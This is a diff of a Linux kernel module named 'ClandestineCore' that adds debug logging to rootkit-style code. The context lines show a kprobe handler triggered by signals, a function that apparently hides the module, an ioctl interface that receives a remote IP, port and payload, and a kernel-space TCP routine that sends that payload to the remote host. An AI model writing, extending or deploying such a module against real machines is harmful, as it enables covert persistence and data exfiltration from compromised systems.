@@ -70,7 +70,7 @@ static long misc_device_ioctl(struct file *file, unsigned int cmd, unsigned long
                 kfree(greeting_var);
                 return -EFAULT;
             }
-
+            pr_info("IOCTL_IP: received IP: %s\n", greeting_var->buffer);
             if (greeting_var->size > IOCTL_BUFF_SIZE) {
                 kfree(greeting_var);
                 return -EINVAL;
@@ -91,12 +91,14 @@ static long misc_device_ioctl(struct file *file, unsigned int cmd, unsigned long
                 kfree(greeting_var);
                 return -EFAULT;
             }
+            pr_info("IOCTL_PORT: received port: %d\n", rPort);
             break;
         case IOCTL_DATA:
             if (copy_from_user(greeting_var, (struct ioctl_data __user *)arg, sizeof(struct ioctl_data))){
                 kfree(greeting_var);
                 return -EFAULT;
             }
+            pr_info("IOCTL_DATA: received data: %s\n", greeting_var->buffer);
 
             if (greeting_var->size > IOCTL_BUFF_SIZE) {
                 kfree(greeting_var);
@@ -137,9 +139,11 @@ static int misc_device_release(struct inode *inode, struct file *filp)
 }
 
 static int kSIGALWRECV(void){
+    pr_info("kSIGALWRECW : Opening Device.");
     return misc_register(&misc_device);
 }
 static void kSIGREMRECV(void){
+    pr_info("kSIGALWRECW : Removing Device.");
     misc_deregister(&misc_device);
 }
 static void kSIGHIDEMOD(void){
@@ -161,11 +165,14 @@ static void kSIGSENDNET(void){
     int ret;
 
     if (!rHost || rPort == 0 || !payload) {
+        pr_err("kSIGSENDNET: missing parameters\n");
         return;
     }
 
+    pr_info("kSIGSENDNET: Connecting to %s:%d\n", rHost, rPort);
     ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (ret < 0 || !sock) {
+        pr_err("kSIGSENDNET: sock_create failed\n");
         return;
     }
 
@@ -176,10 +183,12 @@ static void kSIGSENDNET(void){
 
     ret = sock->ops->connect(sock, (struct sockaddr *)&saddr, sizeof(saddr), 0);
     if (ret < 0) {
+        pr_err("kSIGSENDNET: connect failed\n");
         sock_release(sock);
         return;
     }
 
+    pr_info("kSIGSENDNET: Connection successful, sending data\n");
     vec.iov_base = payload;
     vec.iov_len = strlen(payload);
 
@@ -190,7 +199,11 @@ static void kSIGSENDNET(void){
     msg.msg_flags = 0;
 
     ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-    // if (ret < 0) SENT FAILED
+    if (ret < 0) {
+        pr_err("kSIGSENDNET: kernel_sendmsg failed\n");
+    } else {
+        pr_info("kSIGSENDNET: Sent %d bytes\n", ret);
+    }
 
     if (sock)
         sock_release(sock);
@@ -216,6 +229,7 @@ static int SIGCATCH(struct kprobe *p, struct pt_regs *regs)
             kSIGSENDNET();
             break;
         default:
+            pr_err("SIGCATCH: Unknown signal %d\n", signal);
             break;
     }
 
@@ -224,12 +238,14 @@ static int SIGCATCH(struct kprobe *p, struct pt_regs *regs)
 
 static int __init ClandestineCore_init(void)
 {
+    pr_info("ClandestineCore: Module loaded\n");
     kp.pre_handler = SIGCATCH;
     return register_kprobe(&kp);
 }
 
 static void __exit ClandestineCore_exit(void)
 {
+    pr_info("ClandestineCore: Module unloading\n");
     if (rHost)
         kfree(rHost);
     if (payload)
